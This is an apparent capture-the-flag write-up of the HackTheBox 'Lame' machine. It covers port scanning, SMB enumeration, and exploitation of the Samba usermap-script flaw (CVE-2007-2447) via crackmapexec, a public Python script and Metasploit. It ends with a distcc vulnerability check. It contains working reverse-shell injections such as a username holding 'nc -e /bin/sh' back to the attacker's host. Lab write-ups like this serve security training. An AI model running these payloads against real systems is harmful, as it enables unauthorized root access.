I"òÐ<blockquote>
  <p>Lame is the first machine published on HackTheBox which is vulnerable to SAMBA 3.0.20 (CVE-2007-2447) and Distcc(CVE-2004-2687) exploits. First we will own root using SAMBA exploit manually and later with Metasploit.
Weâ€™ll also use Distcc exploit which unlike samba exploit gives us user shell and thus further we will use various privilege escalation methods like nmap SUID binary, Weak SSH Key, UnrealIRCd to gain root shell.</p>
</blockquote>

<h2 id="tasks">Tasks</h2>

<ul>
  <li>Recon using <code class="language-plaintext highlighter-rouge">masscan</code> and <code class="language-plaintext highlighter-rouge">nmap</code></li>
  <li>Enumerating individual ports to discover misconfiguration &amp; vulnerabilities</li>
  <li>Analysis <code class="language-plaintext highlighter-rouge">Samba 3.0</code> Metasploit username map script</li>
  <li>Exploiting SAMBA manually with crackmapexec to own root</li>
  <li>Exploiting <code class="language-plaintext highlighter-rouge">CVE-2007-2447</code> with usermap script from <code class="language-plaintext highlighter-rouge">amriunix</code></li>
  <li>Using Metasploit to exploit SAMBA</li>
  <li>Exploiting <code class="language-plaintext highlighter-rouge">Distcc</code> using nmap script to get user <code class="language-plaintext highlighter-rouge">daemon</code> shell</li>
  <li>PrivEsc1: using <code class="language-plaintext highlighter-rouge">nmap</code> SUID binary to get root</li>
  <li>PrivEsc2: Exploiting <code class="language-plaintext highlighter-rouge">CVE-2008-0166</code> to get root user SSH key</li>
  <li>PrivEsc3: Creating <code class="language-plaintext highlighter-rouge">UnrealIRCd</code> backdoor using <code class="language-plaintext highlighter-rouge">connect-back shell</code> method</li>
</ul>

<h2 id="reconnaissance">Reconnaissance</h2>

<p>Weâ€™ll start with <code class="language-plaintext highlighter-rouge">masscan</code> &amp; <code class="language-plaintext highlighter-rouge">nmap</code> to discover open ports and services:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb
â†’ masscan <span class="nt">-e</span> tun0 <span class="nt">-p0-65535</span> <span class="nt">--max-rate</span> 500 10.10.10.3

Starting masscan 1.0.5 <span class="o">(</span>http://bit.ly/14GZzcT<span class="o">)</span> at 2020-09-13 19:52:49 GMT
 <span class="nt">--</span> forced options: <span class="nt">-sS</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">--randomize-hosts</span> <span class="nt">-v</span> <span class="nt">--send-eth</span>
Initiating SYN Stealth Scan
Scanning 1 hosts <span class="o">[</span>65536 ports/host]
Discovered open port 21/tcp on 10.10.10.3
Discovered open port 3632/tcp on 10.10.10.3
Discovered open port 22/tcp on 10.10.10.3
Discovered open port 445/tcp on 10.10.10.3
Discovered open port 139/tcp on 10.10.10.3

cfx:  ~/Documents/htb
â†’ nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p21</span>,22,139,445,3632 10.10.10.3
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-09-14 01:27 IST
Nmap scan report <span class="k">for </span>10.10.10.3
Host is up <span class="o">(</span>0.25s latency<span class="o">)</span><span class="nb">.</span>

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.14.17
|      Logged <span class="k">in </span>as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session <span class="nb">timeout </span><span class="k">in </span>seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd <span class="o">(</span>DSA<span class="o">)</span>
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 <span class="o">(</span>RSA<span class="o">)</span>
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
3632/tcp open  distccd     distccd v1 <span class="o">((</span>GNU<span class="o">)</span> 4.2.4 <span class="o">(</span>Ubuntu 4.2.4-1ubuntu4<span class="o">))</span>
Service Info: OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h01m38s, deviation: 2h49m44s, median: 1m36s
| smb-os-discovery:
|   OS: Unix <span class="o">(</span>Samba 3.0.20-Debian<span class="o">)</span>
|   Computer name: lame
|   NetBIOS computer name:
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System <span class="nb">time</span>: 2020-09-13T15:59:50-04:00
| smb-security-mode:
|   account_used: &lt;blank&gt;
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
|_smb2-time: Protocol negotiation failed <span class="o">(</span>SMB2<span class="o">)</span>

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>56.11 seconds
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Based on our scan results we found the following services running on respective ports:</p>

<ul>
  <li>Port 21: <code class="language-plaintext highlighter-rouge">vsftpd 2.3.4</code></li>
  <li>Port 22: <code class="language-plaintext highlighter-rouge">OpenSSH 4.7p1</code></li>
  <li>Port 139,445: <code class="language-plaintext highlighter-rouge">Samba 3.0.20</code></li>
  <li>Port 3632: <code class="language-plaintext highlighter-rouge">Distccd v1</code></li>
</ul>

<p>Lets enumerate these ports further to find out if any of these services are misconfigured or running vulnerable versions.</p>

<h3 id="ftp---port-21">FTP - Port 21</h3>

<p>Anonymous login is allowed on FTP but the directory is empty, so we can move ahead:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb/lame
â†’ ftp 10.10.10.3
Connected to 10.10.10.3.
220 <span class="o">(</span>vsFTPd 2.3.4<span class="o">)</span>
Name <span class="o">(</span>10.10.10.3:root<span class="o">)</span>: anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system <span class="nb">type </span>is UNIX.
Using binary mode to transfer files.
ftp&gt; <span class="nb">dir
</span>200 PORT <span class="nb">command </span>successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.
ftp&gt; <span class="nb">pwd
</span>257 <span class="s2">"/"</span>
ftp&gt; <span class="nb">exit
</span>221 Goodbye.
</pre></td></tr></tbody></table></code></pre></div></div>

<p>We also saw FTP version running is <code class="language-plaintext highlighter-rouge">vsftpd 2.3.4</code>. A quick Google search reveals itâ€™s vulnerable to <strong>Backdoor Command Execution</strong>.</p>

<p>We can use nmap script to confirm this vulnerability.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb/lame
â†’ locate <span class="k">*</span>.nse | <span class="nb">grep </span>vsftpd
/usr/share/nmap/scripts/ftp-vsftpd-backdoor.nse

cfx:  ~/Documents/htb/lame
â†’ nmap <span class="nt">--script</span> ftp-vsftpd-backdoor.nse <span class="nt">-p21</span> 10.10.10.3
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-09-14 01:29 IST
Nmap scan report <span class="k">for </span>10.10.10.3
Host is up <span class="o">(</span>0.30s latency<span class="o">)</span><span class="nb">.</span>

PORT   STATE SERVICE
21/tcp open  ftp

Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>23.11 seconds
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Based on the script output we can see the host is not vulnerable to <code class="language-plaintext highlighter-rouge">vsftpd 2.3.4</code> backdoor command execution.</p>

<h3 id="samba---port-139445">SAMBA - Port 139,445</h3>

<h4 id="null-session-anonymous-login">Null Session (Anonymous Login)</h4>

<p>Using <code class="language-plaintext highlighter-rouge">null session</code> with <code class="language-plaintext highlighter-rouge">crackmapexec</code> we discover we have READ,WRITE access to <code class="language-plaintext highlighter-rouge">tmp</code> directory</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb/lame
â†’ crackmapexec smb <span class="nt">--shares</span> 10.10.10.3 <span class="nt">-u</span> <span class="s1">''</span> <span class="nt">-p</span> <span class="s1">''</span>
SMB         10.10.10.3      445    LAME             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Unix <span class="o">(</span>name:LAME<span class="o">)</span> <span class="o">(</span>domain:hackthebox.gr<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
SMB         10.10.10.3      445    LAME             <span class="o">[</span>+] hackthebox.gr<span class="se">\:</span>
SMB         10.10.10.3      445    LAME             <span class="o">[</span>+] Enumerated shares
SMB         10.10.10.3      445    LAME             Share           Permissions     Remark
SMB         10.10.10.3      445    LAME             <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
SMB         10.10.10.3      445    LAME             print<span class="nv">$ </span>                         Printer Drivers
SMB         10.10.10.3      445    LAME             tmp             READ,WRITE      oh noes!
SMB         10.10.10.3      445    LAME             opt
SMB         10.10.10.3      445    LAME             IPC<span class="nv">$ </span>                           IPC Service <span class="o">(</span>lame server <span class="o">(</span>Samba 3.0.20-Debian<span class="o">))</span>
SMB         10.10.10.3      445    LAME             ADMIN<span class="nv">$ </span>                         IPC Service <span class="o">(</span>lame server <span class="o">(</span>Samba 3.0.20-Debian<span class="o">))</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Letâ€™s enumerate the tmp directory using <code class="language-plaintext highlighter-rouge">smbclient</code>. Since this box is running an older version of SMB, on newer client we cannot use smbclient without adding older protocol config to <code class="language-plaintext highlighter-rouge">/etc/samba/smb.conf</code></p>

<p>Credits to <a href="https://twitter.com/0xdf"><strong>0xdf</strong></a> for providing the protocol info on his Write-up.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="go">[global]
client min protocol=NT1
</span></pre></td></tr></tbody></table></code></pre></div></div>
<p>We can either add the above config to our <code class="language-plaintext highlighter-rouge">/etc/samba/smb.conf</code> or we can use the command line option:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb/lame
â†’ smbclient <span class="nt">-N</span> //10.10.10.3/tmp <span class="nt">--option</span><span class="o">=</span><span class="s1">'client min protocol=NT1'</span>
Anonymous login successful
Try <span class="s2">"help"</span> to get a list of possible commands.
smb: <span class="se">\&gt;</span> <span class="nb">pwd
</span>Current directory is <span class="se">\\</span>10.10.10.3<span class="se">\t</span>mp<span class="se">\</span>
smb: <span class="se">\&gt;</span> <span class="nb">dir</span>
  <span class="nb">.</span>                                   D        0  Mon Sep 14 01:38:09 2020
  ..                                 DR        0  Mon May 21 00:06:12 2012
  5145.jsvc_up                        R        0  Sun Sep 13 17:39:08 2020
  .ICE-unix                          DH        0  Sun Sep 13 17:38:05 2020
  .X11-unix                          DH        0  Sun Sep 13 17:38:30 2020
  .X0-lock                           HR       11  Sun Sep 13 17:38:30 2020

                7282168 blocks of size 1024. 5678708 blocks available
smb: <span class="se">\&gt;</span> <span class="nb">exit</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>We donâ€™t find anything useful inside the tmp directory.</p>

<h2 id="samba-exploit">SAMBA Exploit</h2>

<h3 id="manual-exploitation-analysis">Manual Exploitation analysis</h3>

<p>Searching for samba 3.0 on <code class="language-plaintext highlighter-rouge">searchsploit</code> reveals it has quite some vulnerabilities:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb/lame
â†’ searchsploit samba 3.0
<span class="nt">----------------------------------------------------------</span> <span class="nt">---------------------------------</span>
 Exploit Title                                            |  Path
<span class="nt">----------------------------------------------------------</span> <span class="nt">---------------------------------</span>
Samba 3.0.10 <span class="o">(</span>OSX<span class="o">)</span> - <span class="s1">'lsa_io_trans_names'</span> Heap Overflow <span class="o">(</span> | osx/remote/16875.rb
Samba 3.0.10 &lt; 3.3.5 - Format String / Security Bypass    | multiple/remote/10095.txt
Samba 3.0.20 &lt; 3.0.25rc3 - <span class="s1">'Username'</span> map script<span class="s1">' Command | unix/remote/16320.rb
Samba 3.0.21 &lt; 3.0.24 - LSA trans names Heap Overflow (Me | linux/remote/9950.rb
Samba 3.0.24 (Linux) - '</span>lsa_io_trans_names<span class="s1">' Heap Overflow | linux/remote/16859.rb
Samba 3.0.24 (Solaris) - '</span>lsa_io_trans_names<span class="s1">' Heap Overfl | solaris/remote/16329.rb
Samba 3.0.27a - '</span>send_mailslot<span class="o">()</span><span class="s1">' Remote Buffer Overflow  | linux/dos/4732.c
Samba 3.0.29 (Client) - '</span>receive_smb_raw<span class="o">()</span><span class="s1">' Buffer Overfl | multiple/dos/5712.pl
Samba 3.0.4 - SWAT Authorisation Buffer Overflow          | linux/remote/364.pl
Samba &lt; 3.0.20 - Remote Heap Overflow                     | linux/remote/7701.txt
Samba &lt; 3.0.20 - Remote Heap Overflow                     | linux/remote/7701.txt
Samba &lt; 3.6.2 (x86) - Denial of Service (PoC)             | linux_x86/dos/36741.py
---------------------------------------------------------- ---------------------------------
</span></pre></td></tr></tbody></table></code></pre></div></div>
<p>The one which looks interesting is the Metasploit script <code class="language-plaintext highlighter-rouge">Samba 3.0.20 &lt; 3.0.25rc3 - 'Username' map script' Command | unix/remote/16320.rb</code> which could possibly give us RCE.</p>

<p>Looking at the Metasploit script we discover this is  <code class="language-plaintext highlighter-rouge">CVE-2007-2447</code> also known as Samba Usermap script.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="gp">'References'     =&gt;</span><span class="w">
</span><span class="go">    [
         [ 'CVE', '2007-2447' ],
         [ 'OSVDB', '34700' ],
         [ 'BID', '23972' ],
         [ 'URL', 'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=534' ],
         [ 'URL', 'http://samba.org/samba/security/CVE-2007-2447.html' ]
    ],
</span></pre></td></tr></tbody></table></code></pre></div></div>

<p>Further analysis on Metasploit script indicates the vulnerability is in the <code class="language-plaintext highlighter-rouge">Username</code> field which takes the below parameter along with the payload.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="go">"/=`nohup " + payload.encoded + "`"
</span></pre></td></tr></tbody></table></code></pre></div></div>

<p>In POSIX or POSIX-like shells (ksh, bash, ash, zsh, yash), The command in the braces of $() or between the backticks (``) is executed in a subshell and the output is then placed in the original command.</p>

<p>Metasploit is using the <code class="language-plaintext highlighter-rouge">nohup</code> command short for no hang up which is a command in Linux systems that keep processes running even after exiting the shell or terminal and starting the process outside of current context then a payload.</p>

<h2 id="root-shell">Root shell</h2>

<h3 id="crackmapexec---username">Crackmapexec - Username</h3>

<p>Sending the username field data along with reverse shell payload via crackmapexec to get reverse shell as root:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb/lame
â†’ crackmapexec smb <span class="nt">--shares</span> 10.10.10.3 <span class="nt">-u</span> <span class="s1">'./=`nohup nc -e /bin/sh 10.10.14.17 8021`'</span> <span class="nt">-p</span> <span class="s1">''</span>
SMB         10.10.10.3      445    LAME             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Unix <span class="o">(</span>name:LAME<span class="o">)</span> <span class="o">(</span>domain:hackthebox.gr<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<h3 id="getting-a-call-back-on-our-nc-listener">Getting a call back on our nc listener</h3>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb/lame/CVE-2007-2447  |master âœ“|
â†’ nc <span class="nt">-lvnp</span> 8021
Ncat: Version 7.80 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
Ncat: Listening on :::8021
Ncat: Listening on 0.0.0.0:8021
Ncat: Connection from 10.10.10.3.
Ncat: Connection from 10.10.10.3:53556.
<span class="nb">whoami
</span>root
<span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
<span class="nb">exit</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>We got the shell as root.</p>

<h3 id="crackmapexec---smbexec">Crackmapexec - SMBEXEC</h3>

<p>We can also use the <code class="language-plaintext highlighter-rouge">smbexec</code> command from crackmapexec to send our payload and execute it:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb/lame
â†’ crackmapexec smb <span class="nt">-x</span> <span class="s2">"./=</span><span class="sb">`</span><span class="nb">nohup </span>nc <span class="nt">-e</span> /bin/sh 10.10.14.17 8022<span class="sb">`</span><span class="s2">"</span> <span class="nt">--exec-method</span> smbexec 10.10.10.3
<span class="nb">nohup</span>: ignoring input and redirecting stderr to stdout
SMB         10.10.10.3      445    LAME             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Unix <span class="o">(</span>name:LAME<span class="o">)</span> <span class="o">(</span>domain:hackthebox.gr<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>

cfx:  ~/Documents/htb/lame
â†’ nc <span class="nt">-lvnp</span> 8022
Ncat: Version 7.80 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
Ncat: Listening on :::8022
Ncat: Listening on 0.0.0.0:8022
Ncat: Connection from 10.10.14.17.
Ncat: Connection from 10.10.14.17:47782.
<span class="nb">whoami
</span>root
<span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
<span class="nb">exit</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<h3 id="usermap-python-script---amriunix">Usermap python script - amriunix</h3>

<p>While searching for CVE-2007-2447 exploits, I came across this <a href="https://github.com/amriunix/CVE-2007-2447/blob/master/usermap_script.py"><strong>python-script</strong></a> from <strong>amriunix</strong>, Usage and guidelines to install dependencies is available on the repo.</p>

<p>Using usermap script we can instantly get a reverse shell:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb/lame/CVE-2007-2447  |master âœ“|
â†’ python3 usermap_script.py
<span class="o">[</span><span class="k">*</span><span class="o">]</span> CVE-2007-2447 - Samba usermap script
<span class="o">[</span>-] usage: python usermap_script.py &lt;RHOST&gt; &lt;RPORT&gt; &lt;LHOST&gt; &lt;LPORT&gt;

cfx:  ~/Documents/htb/lame/CVE-2007-2447  |master âœ“|
â†’ python3 usermap_script.py 10.10.10.3 139 10.10.14.17 8020
<span class="o">[</span><span class="k">*</span><span class="o">]</span> CVE-2007-2447 - Samba usermap script
<span class="o">[</span>+] Connecting <span class="o">!</span>
<span class="o">[</span>+] Payload was sent - check netcat <span class="o">!</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<p>As soon as the script is executed, we get a call back on our <code class="language-plaintext highlighter-rouge">nc</code> listener:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb/lame/
â†’ nc <span class="nt">-lvnp</span> 8020
Ncat: Version 7.80 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
Ncat: Listening on :::8020
Ncat: Listening on 0.0.0.0:8020
Ncat: Connection from 10.10.10.3.
Ncat: Connection from 10.10.10.3:58452.
<span class="nb">whoami
</span>root
<span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
python <span class="nt">-c</span> <span class="s2">"import pty;pty.spawn('/bin/bash')"</span>
root@lame:/# <span class="nb">cd</span> /home
<span class="nb">cd</span> /home
root@lame:/home# <span class="nb">cd </span>makis
<span class="nb">cd </span>makis
root@lame:/home/makis# <span class="nb">cat </span>user.txt
<span class="nb">cat </span>user.txt
69454a937d94f5f<span class="k">*****************</span>
root@lame:/home/makis# <span class="nb">cd</span> /root
<span class="nb">cd</span> /root
root@lame:/root# <span class="nb">cat </span>root.txt
<span class="nb">cat </span>root.txt
92caac3be140ef4<span class="k">*****************</span>
root@lame:/root# <span class="nb">exit</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Using any of the above methods we get a shell as root from where we can grab our flags.</p>

<h3 id="metasploit">Metasploit</h3>

<p>Since we have already exploited <code class="language-plaintext highlighter-rouge">samba 3.0</code> manually, letâ€™s also exploit it with Metasploit:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
</pre></td><td class="rouge-code"><pre>msf5 <span class="o">&gt;</span> search usermap

Matching Modules
<span class="o">================</span>

   <span class="c">#  Name                                Disclosure Date  Rank       Check  Description</span>
   -  <span class="nt">----</span>                                <span class="nt">---------------</span>  <span class="nt">----</span>       <span class="nt">-----</span>  <span class="nt">-----------</span>
   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba <span class="s2">"username map script"</span> Command Execution


msf5 <span class="o">&gt;</span> use exploit/multi/samba/usermap_script
<span class="o">[</span><span class="k">*</span><span class="o">]</span> No payload configured, defaulting to cmd/unix/reverse_netcat
msf5 exploit<span class="o">(</span>multi/samba/usermap_script<span class="o">)</span> <span class="o">&gt;</span> show options

Module options <span class="o">(</span>exploit/multi/samba/usermap_script<span class="o">)</span>:

   Name    Current Setting  Required  Description
   <span class="nt">----</span>    <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
   RHOSTS                   <span class="nb">yes       </span>The target host<span class="o">(</span>s<span class="o">)</span>, range CIDR identifier, or hosts file with syntax <span class="s1">'file:&lt;path&gt;'</span>
   RPORT   139              <span class="nb">yes       </span>The target port <span class="o">(</span>TCP<span class="o">)</span>


Payload options <span class="o">(</span>cmd/unix/reverse_netcat<span class="o">)</span>:

   Name   Current Setting  Required  Description
   <span class="nt">----</span>   <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
   LHOST  10.0.2.15        <span class="nb">yes       </span>The listen address <span class="o">(</span>an interface may be specified<span class="o">)</span>
   LPORT  4444             <span class="nb">yes       </span>The listen port


Exploit target:

   Id  Name
   <span class="nt">--</span>  <span class="nt">----</span>
   0   Automatic


msf5 exploit<span class="o">(</span>multi/samba/usermap_script<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>RHOSTS 10.10.10.3
RHOSTS <span class="o">=&gt;</span> 10.10.10.3
msf5 exploit<span class="o">(</span>multi/samba/usermap_script<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>LHOST tun0
LHOST <span class="o">=&gt;</span> tun0
msf5 exploit<span class="o">(</span>multi/samba/usermap_script<span class="o">)</span> <span class="o">&gt;</span> exploit

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.10.14.17:4444
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Command shell session 1 opened <span class="o">(</span>10.10.14.17:4444 -&gt; 10.10.10.3:53196<span class="o">)</span> at 2020-09-14 17:36:33 +0530

<span class="nb">whoami
</span>root
<span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
quit
</pre></td></tr></tbody></table></code></pre></div></div>
<p>We get the shell as root with Metasploit as well.</p>

<h2 id="distcc-exploit">Distcc Exploit</h2>

<p>During our enumeration phase we saw <code class="language-plaintext highlighter-rouge">Distccd v1</code> service was running on <code class="language-plaintext highlighter-rouge">Port 3632</code></p>

<p>Distcc is a program designed to distribute compiling tasks across a network to participating hosts. It is comprised of a server, distccd, and a client program, distcc. Distcc can work transparently with ccache, Portage, and Automake with a small amount of setup.</p>

<p>A Quick google search reveals Distccd v1 is vulnerable to command execution and we also an have <code class="language-plaintext highlighter-rouge">nmap</code> script to test this vulnerability.</p>

<h3 id="nmap-script">nmap Script</h3>

<p>If the script is not available in <code class="language-plaintext highlighter-rouge">nmap</code> package by default, you can download it from <a href="https://svn.nmap.org/nmap/scripts/distcc-cve2004-2687.nse"><strong>here</strong></a> and place it in the nmap scripts directory.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb/lame
â†’ locate <span class="k">*</span>.nse | <span class="nb">grep</span> <span class="nt">-i</span> distcc
/usr/share/nmap/scripts/distcc-cve2004-2687.nse

cfx:  ~/Documents/htb/lame
â†’ nmap <span class="nt">--script</span> distcc-cve2004-2687.nse <span class="nt">-p3632</span> 10.10.10.3
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-09-14 01:32 IST
Nmap scan report <span class="k">for </span>10.10.10.3
Host is up <span class="o">(</span>0.22s latency<span class="o">)</span><span class="nb">.</span>

PORT     STATE SERVICE
3632/tcp open  distccd
| distcc-cve2004-2687:
|   VULNERABLE:
|   distcc Daemon Command Execution
|     State: VULNERABLE <span class="o">(</span>Exploitable<span class="o">)</span>
|     IDs:  CVE:CVE-2004-2687
|     Risk <span class="nb">factor</span>: High  CVSSv2: 9.3 <span class="o">(</span>HIGH<span class="o">)</span> <span class="o">(</span>AV:N/AC:M/Au:N/C:C/I:C/A:C<span class="o">)</span>
|       Allows executing of arbitrary commands on systems running distccd 3.1 and
|       earlier. The vulnerability is the consequence of weak service configuration.
|
|     Disclosure <span class="nb">date</span>: 2002-02-01
|     Extra information:
|
|     <span class="nv">uid</span><span class="o">=</span>1<span class="o">(</span>daemon<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1<span class="o">(</span>daemon<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1<span class="o">(</span>daemon<span class="o">)</span>
|
|     References:
|       https://distcc.github.io/security.html
|       https://nvd.nist.gov/vuln/detail/CVE-2004-2687
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="o">=</span>CVE-2004-2687

